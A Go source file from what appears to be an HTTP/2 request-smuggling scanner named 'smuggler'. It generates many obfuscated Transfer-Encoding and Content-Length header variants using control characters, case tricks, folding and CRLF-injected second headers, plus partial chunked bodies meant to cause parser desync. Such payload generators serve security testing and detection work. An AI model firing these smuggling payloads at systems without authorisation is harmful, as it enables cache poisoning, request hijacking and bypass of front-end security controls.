package tests

import (
	"fmt"
	"smuggler/config"
	"smuggler/smuggler/h2"
)

// payload type [CL,TE] and test level [1-3]

type PTYPE byte

const (
	TE PTYPE = iota
	CL
	CRLF
)

var typeName = map[PTYPE]string{
	TE:   "TE",
	CL:   "CL",
	CRLF: "CRLF",
}

func (t PTYPE) String() string {
	if res, ok := typeName[t]; ok {
		return res
	}
	return fmt.Sprintf("unknown type name: %c", t)
}

type Generator struct{}

func (g *Generator) Generate(_type PTYPE, level config.LEVEL) map[string][]string {
	generators := map[PTYPE]map[config.LEVEL]func() map[string][]string{
		TE: {
			config.B: g.generateTEBasic,
			config.M: g.generateTEModerate,
			config.E: g.generateTEExhaustive,
		},
		CL: {
			config.B: g.generateCLBasic,
			config.M: g.generateCLModerate,
			config.E: g.generateCLExhaustive,
		},
		CRLF: {
			config.B: g.generateCRLF,
			config.M: g.generateCRLF,
			config.E: g.generateCRLF,
		},
	}

	if gentype, found := generators[_type]; found {
		if generator, levelFound := gentype[level]; levelFound {
			return generator()
		}
		return nil
	}
	return nil
}

// keep the same formating when joining to make a header (no space after colon)
func (g *Generator) generateTEBasic() map[string][]string {
	te := make(map[string][]string)

	te["Transfer-Encoding"] = []string{" chunked"}
	te[" Transfer-Encoding"] = []string{" chunked"}
	te["Transfer-Encoding"] = []string{"\tchunked"}
	te["Transfer-Encoding\t"] = []string{"\tchunked"}
	te[" Transfer-Encoding "] = []string{" chunked"}

	chars := []byte{0x1, 0x4, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0x1F, 0x20, 0x7f, 0xA0, 0xFF}
	keys := []string{
		"Transfer-Encoding%c",
		"%cTransfer-Encoding",
		"X: X%cTransfer-Encoding",
		"X: X\r%cTransfer-Encoding",
		"X: X%c\nTransfer-Encoding",
	}
	vals := []string{
		"%cchunked",
		" chunked%c",
		" chunked%cX: X",
		" chunked\r%cX",
		" chunked%cX: X",
	}
	for _, i := range chars {
		for _, v := range vals {
			te["Transfer-Encoding"] = append(te["Transfer-Encoding"], fmt.Sprintf(v, i))
		}
		for _, v := range keys {
			key := fmt.Sprintf(v, i)
			te[key] = append(te[key], " chunked")
		}
	}
	return te
}

func (g *Generator) generateTEModerate() map[string][]string {
	te := make(map[string][]string)
	ranges := [2][2]int{{0x1, 0x21}, {0x7F, 0x100}}

	for _, r := range ranges {
		for i := r[0]; i < r[1]; i++ {
			teCharChar := fmt.Sprintf("%cTransfer-Encoding%c", i, i)
			teChar := fmt.Sprintf("%cTransfer-Encoding", i)
			teCharF := fmt.Sprintf("Transfer-Encoding%c", i)

			te[teCharChar] = append(te[teCharChar], "chunked")
			te[teChar] = append(te[teChar], fmt.Sprintf("%cchunked", i))
			te[teChar] = append(te[teChar], fmt.Sprintf(" chunked%c", i))
			te[teCharF] = append(te[teCharF], fmt.Sprintf("%cchunked", i))
			te[teCharF] = append(te[teCharF], fmt.Sprintf(" chunked%c", i))
			te["Transfer-Encoding"] = append(te["Transfer-Encoding"], fmt.Sprintf("%cchunked%c", i, i))
		}
	}
	return te
}

func (g *Generator) generateTEExhaustive() map[string][]string {
	te := make(map[string][]string)

	te[" Transfer-Encoding"] = append(te[" Transfer-Encoding"], " chunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], "\tchunked")
	te["Transfer-Encoding\t"] = append(te["Transfer-Encoding\t"], "\tchunked")
	te["Transfer Encoding"] = append(te["Transfer Encoding"], " chunked")
	te["Transfer_Encoding"] = append(te["Transfer_Encoding"], " chunked")
	te["Transfer Encoding"] = append(te["Transfer Encoding"], "chunked")
	te["Transfer-Encoding "] = append(te["Transfer-Encoding "], "chunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], "  chunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], "\u000Bchunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " chunked, cow")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " cow, chunked")
	te["Content-Encoding"] = append(te["Content-Encoding"], " chunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], "\n chunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " \"chunked\"")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " 'chunked'")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " chunk")
	te["TrAnSFer-EnCODinG"] = append(te["TrAnSFer-EnCODinG"], " cHuNkeD")
	te["TRANSFER-ENCODING"] = append(te["TRANSFER-ENCODING"], " CHUNKED")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " chunked\r")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " chunked\t")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " cow\r\nTransfer-Encoding: chunked")
	te["Transfer\r-Encoding"] = append(te["Transfer\r-Encoding"], " chunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " cow chunked bar")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], "\xFFchunked")
	te["Transfer-Encoding"] = append(te["Transfer-Encoding"], " ch\x96nked")
	te["Transf\x82r-Encoding"] = append(te["Transf\x82r-Encoding"], " chunked")
	te["X:X\rTransfer-Encoding"] = append(te["X:X\rTransfer-Encoding"], " chunked")
	te["X:X\nTransfer-Encoding"] = append(te["X:X\nTransfer-Encoding"], " chunked")

	ranges := [2][2]int{{0x1, 0x20}, {0x7F, 0x100}}
	for _, r := range ranges {
		for i := r[0]; i < r[1]; i++ {
			te["Transfer-Encoding"] = append(te["Transfer-Encoding"], fmt.Sprintf("%cchunked", i))
			te["Transfer-Encoding"] = append(te["Transfer-Encoding"], fmt.Sprintf(" chunked%c", i))
			tmpK := fmt.Sprintf("Transfer-Encoding%c", i)
			te[tmpK] = append(te[tmpK], " chunked")
			tmpK = fmt.Sprintf("%cTransfer-Encoding", i)
			te[tmpK] = append(te[tmpK], " chunked")
		}
	}
	return te
}

func (g *Generator) generateCLBasic() map[string][]string {
	cl := make(map[string][]string)
	chars := []byte{0x1, 0x4, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0x1F, 0x20, 0x7f, 0xA0, 0xFF}
	vals := []string{
		"Content-Length%c",
		"%cContent-Length",
		"X: X%cContent-Length",
		"X: X\r%cContent-Length",
		"X: X%c\nContent-Length",
	}
	cl["Content-Length"] = append(cl["Content-Length"],
		"Content-Length",
		" Content-Length",
		"Content-Length\t",
		" Content-Length ")
	for _, ch := range chars {
		for _, val := range vals {
			cl["Content-Length"] = append(cl["Content-Length"], fmt.Sprintf(val, ch))
		}
	}
	return cl
}

func (g *Generator) generateCLModerate() map[string][]string {
	cl := make(map[string][]string)
	cl["Content-Length"] = []string{}

	ranges := [2][2]int{{0x1, 0x21}, {0x7F, 0x100}}
	for _, r := range ranges {
		for i := r[0]; i < r[1]; i++ {
			cl["Content-Length"] = append(cl["Content-Length"],
				fmt.Sprintf("%cContent-Length%c", i, i),
				fmt.Sprintf("%cContent-Length", i),
				fmt.Sprintf("Content-Length%c", i))
		}
	}
	return cl
}

func (g *Generator) generateCLExhaustive() map[string][]string {
	cl := make(map[string][]string)
	cl["Content-Length"] = append(cl["Content-Length"],
		" Content-Length",
		"Content-Length\t",
		"Content Length",
		"Content_Length",
		"Content-Length ",
		"CoNtENt-LeNGTh",
		"CONTENT-LENGTH",
		"Content\r-Length",
		"Cont\x82nt-Length",
		"X: X\rContent-Length",
		"X: X\nContent-Length",
	)

	ranges := [2][2]int{{0x1, 0x20}, {0x7F, 0x100}}
	for _, r := range ranges {
		for i := r[0]; i < r[1]; i++ {
			cl["Content-Length"] = append(cl["Content-Length"],
				fmt.Sprintf("Content-Length%c", i),
				fmt.Sprintf("%cContent-Length", i))
		}
	}
	return cl
}

// crlf -> would look like
// a header + CRLF + Injected header (CL/TE)
// payload is trying to cause a desync only
func (g *Generator) generateCRLF() map[string][]string {
	crlf := make(map[string][]string)

	cl := g.Generate(CL, config.Glob.Test)
	for _, vv := range cl {
		for i, v := range vv {
			vv[i] = fmt.Sprintf("A\r\n%s", v) // add the value at the req.Payload when sending the request
		}
		crlf["Test1"] = append(crlf["Test1"], vv...)
	}

	te := g.Generate(TE, config.Glob.Test)
	for k, vv := range te {
		for i, v := range vv {
			vv[i] = fmt.Sprintf("A\r\n%s:%s", k, v)
		}
		crlf["Test"] = append(crlf["Test"], vv...)
	}
	return crlf
}

// generates a request body depending on the request type
func (t PTYPE) Body(req *h2.Request, normal bool) {
	if t != CL && t != TE && t != CRLF {
		return
	}

	if t == CL {
		req.Payload.Val = "10"
	}
	if t == CRLF {
		if req.Payload.Key == "Test1" {
			req.Payload.Val += ": 10"
		}
	}

	if normal {
		req.Body = []byte("1\r\nG\r\n0\r\n\r\n")
	} else {
		req.Body = []byte("1\r\nG")
	}
}
